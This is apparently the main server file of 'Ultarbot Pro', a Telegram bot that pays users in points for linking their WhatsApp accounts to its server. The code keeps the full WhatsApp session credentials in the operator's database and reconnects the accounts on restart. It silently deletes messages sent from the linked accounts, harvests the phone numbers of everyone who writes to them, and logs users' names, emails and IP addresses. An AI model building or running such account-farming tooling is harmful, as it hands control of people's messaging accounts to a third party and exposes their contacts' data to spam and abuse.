import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import { Boom } from '@hapi/boom';

import { setupTelegramCommands } from './telegram_commands.js';
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime, saveVerificationData, awardHourlyPoints, deductOnDisconnect
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;

// Parse JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => res.send('Ultarbot Pro Running'));

// Routes will be defined after mainBot initialization

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

// ============ DEFINE EXPRESS ROUTES ============

// Mini app for user verification
app.get('/verify', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Verification</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #333; text-align: center; }
            .form-group { margin: 20px 0; }
            label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }
            input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #20BA5A; }
            .status { text-align: center; margin-top: 10px; padding: 10px; border-radius: 5px; }
            .loading { display: none; }
        </style>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
    </head>
    <body>
        <div class="container">
            <h1>User Verification</h1>
            <form id="verifyForm">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="Enter your email" required>
                </div>
                <button type="submit">Verify & Close</button>
            </form>
            <div class="status" id="status"></div>
        </div>

        <script>
            // Ensure Telegram WebApp is loaded
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    const tg = window.Telegram.WebApp;
                    const verifyForm = document.getElementById('verifyForm');
                    
                    tg.ready();
                    tg.expand();
                    
                    verifyForm.addEventListener('submit', async (e) => {
                        e.preventDefault();
                        
                        const name = document.getElementById('name').value;
                        const email = document.getElementById('email').value;
                        const userId = tg.initData ? tg.initData.split('user')[1].match(/\d+/)?.[0] : 'unknown';
                        
                        // Get IP address
                        let ip = 'N/A';
                        try {
                            const ipRes = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipRes.json();
                            ip = ipData.ip;
                        } catch (e) {}
                        
                        try {
                            const response = await fetch('/api/verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    userId,
                                    name,
                                    email,
                                    ip,
                                    initData: tg.initData
                                })
                            });
                            
                            const result = await response.json();
                            
                            if (result.success) {
                                document.getElementById('status').innerHTML = '<span style="background: #d4edda; color: #155724;">Verification successful!</span>';
                                setTimeout(() => tg.close(), 1500);
                            } else {
                                document.getElementById('status').innerHTML = '<span style="background: #f8d7da; color: #721c24;">' + result.message + '</span>';
                            }
                        } catch (error) {
                            document.getElementById('status').innerHTML = '<span style="background: #f8d7da; color: #721c24;">Error: ' + error.message + '</span>';
                        }
                    });
                } else {
                    document.body.innerHTML = '<div style="padding: 20px; text-align: center;"><h2>Loading...</h2><p>Please make sure you opened this from Telegram.</p></div>';
                }
            }, 100);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// API endpoint to handle verification
app.post('/api/verify', async (req, res) => {
    const { userId, name, email, ip, initData } = req.body;
    
    if (!userId || !name || !email) {
        return res.json({ success: false, message: 'Missing required fields' });
    }
    
    try {
        // Extract device info from navigator if available
        let deviceInfo = 'Mini App User';
        if (initData) {
            // Telegram Mini App data is available
            deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
        }
        
        // Save verification data to database
        await saveVerificationData(userId, name, '', email, ip, deviceInfo);
        
        console.log('[VERIFICATION] Verified:', {
            userId,
            name,
            email,
            ip,
            timestamp: new Date().toISOString()
        });
        
        // Send notification to user via Telegram
        try {
            const sentMsg = await mainBot.sendMessage(userId, 
                `✅ [VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nIP: ${ip}\n\nYou can now use all features of Ultarbot Pro.`,
                { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.error('[TELEGRAM] Send message error:', e.message);
        }
        
        res.json({ success: true, message: 'Verification complete' });
    } catch (error) {
        console.error('[VERIFICATION ERROR]:', error.message);
        res.json({ success: false, message: 'Verification failed: ' + error.message });
    }
});

app.listen(PORT, () => console.log(`Server on ${PORT}`));

// ============ END EXPRESS ROUTES ============

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const notificationCache = {};
const qrMessageCache = {}; // Track QR code messages for deletion
const qrActiveState = {}; // Track if QR is currently being displayed per folder

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

// HOURLY POINTS LOOP - Award 10 pts/hr per connected account, 5 pts/hr per referral
setInterval(async () => {
    try {
        const connectedFolders = Object.keys(clients);
        await awardHourlyPoints(connectedFolders);
    } catch (error) {
        console.error('[POINTS] Hourly award error:', error.message);
    }
}, 3600000); // Every 1 hour

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // Handle QR code for authentication
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update;
        
        // If connection successful, delete old QR message
        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try {
                await mainBot.deleteMessage(qrChatId, messageId);
            } catch (e) {
                console.error('Failed to delete QR message:', e.message);
            }
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        // Only display QR once per connection attempt (no spam)
        if (qr && chatId && !qrActiveState[folder]) {
            qrActiveState[folder] = true; // Mark QR as active for this session
            
            try {
                // Delete old QR message if exists
                if (qrMessageCache[folder]) {
                    try {
                        await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
                    } catch (e) {}
                }
                
                // Import qrcode module for QR generation
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                
                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.\n\nQR expires in 60 seconds.',
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]]
                    }
                });
                
                // Store message ID for later deletion
                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                
                // Set timeout to warn user if QR expires (60 seconds)
                const qrTimeout = setTimeout(async () => {
                    if (qrMessageCache[folder] && qrActiveState[folder]) {
                        try {
                            await mainBot.sendMessage(chatId, '[ERROR] QR code expired. Please tap "Scan QR" again to regenerate.', {
                                reply_markup: {
                                    inline_keyboard: [[{ text: 'Scan QR', callback_data: 'connect_qr' }]]
                                }
                            });
                            await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
                            delete qrMessageCache[folder];
                            // IMPORTANT: Keep qrActiveState[folder] = true to prevent auto-generation
                            // Only reset when user explicitly taps 'Scan QR' button
                        } catch (e) {}
                    }
                }, 60000);
                
                // Store timeout ID for cleanup
                if (!qrMessageCache[folder]) qrMessageCache[folder] = {};
                qrMessageCache[folder].timeoutId = qrTimeout;
                
            } catch (e) {
                console.error('QR generation error:', e.message);
                mainBot.sendMessage(chatId, '[ERROR] Failed to generate QR code. Please try again.').catch(() => {});
                delete qrActiveState[folder];
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg || !msg.message) return;

        // 1. INSTANT SPEED CHECK - ANTIMSG (OPTIMIZED)
        if (msg.key.fromMe && !msg.message.protocolMessage) {
            // Only check ID map if it is from Me
            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
            
            if (myShortId && antiMsgState[myShortId]) {
                const remoteJid = msg.key.remoteJid;
                const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
                
                // Exclusion Check (Don't delete my commands or Status)
                if (remoteJid !== 'status@broadcast' && !text.startsWith('.')) {
                    // 🔥 FIRE AND FORGET: DELETE IMMEDIATELY (NO AWAIT)
                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
                    
                    // Log in background
                    const target = remoteJid.split('@')[0];
                    const now = Date.now();
                    if (now - (notificationCache[target] || 0) > 20000) {
                        updateAdminNotification(`[ANTIMSG] Deleted from ID: ${myShortId} to +${target}`);
                        notificationCache[target] = now;
                    }
                    return; // Stop processing to save speed
                }
            }
        }

        // 2. Incoming Messages Logic
        if (!msg.key.fromMe) {
            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
            if (!myShortId) return;

            const remoteJid = msg.key.remoteJid;
            
            // AutoSave
            if (autoSaveState[myShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    await addNumbersToDb([remoteJid.split('@')[0]]);
                }
            }

            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            let myShortId = await getShortId(folder);
            if (!myShortId) {
                myShortId = generateShortId();
                await saveShortId(folder, myShortId);
            }
            
            // Update connection time on every reconnect
            await updateConnectionTime(folder);
            
            shortIdMap[myShortId] = { folder, phone: phoneNumber, chatId: telegramUserId };
            clients[folder] = sock;

            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            const antimsg = antiMsgState[myShortId] || false;
            const autosave = autoSaveState[myShortId] || false;
            
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', antimsg, autosave);
            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${myShortId})`);

            if (chatId) mainBot.sendMessage(chatId, `[CONNECTED]\nID: ${myShortId}`, { parse_mode: 'Markdown' });
            
            // Set 1-hour timeout to delete offline account
            setTimeout(async () => {
                if (!clients[folder]) {
                    // Account went offline, award points and cleanup
                    try {
                        await awardHourlyPoints([folder]);
                    } catch (e) {
                        console.error('[CLEANUP] Error awarding points:', e.message);
                    }
                }
            }, 3600000); // 1 hour
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`[BANNED/LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deductOnDisconnect(folder);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                // Account went offline, set 1-hour cleanup timer
                const offlineFolder = folder;
                const offlineTimeout = setTimeout(async () => {
                    if (!clients[offlineFolder]) {
                        // Still offline after 1 hour, delete it
                        console.log(`[CLEANUP] Deleting offline account after 1 hour: ${offlineFolder}`);
                        try {
                            await deleteSessionFromDb(offlineFolder);
                            deleteShortId(offlineFolder);
                            if (fs.existsSync(path.join(SESSIONS_DIR, offlineFolder))) {
                                fs.rmSync(path.join(SESSIONS_DIR, offlineFolder), { recursive: true, force: true });
                            }
                        } catch (e) {
                            console.error('[CLEANUP] Error deleting offline account:', e.message);
                        }
                    } else {
                        // Account came back online, cancel cleanup
                        console.log(`[CLEANUP] Account came back online: ${offlineFolder}`);
                    }
                }, 3600000); // 1 hour
                
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    console.log(`[DB] Restoring ${savedSessions.length} sessions...`);
    
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id };
        
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL);
boot();
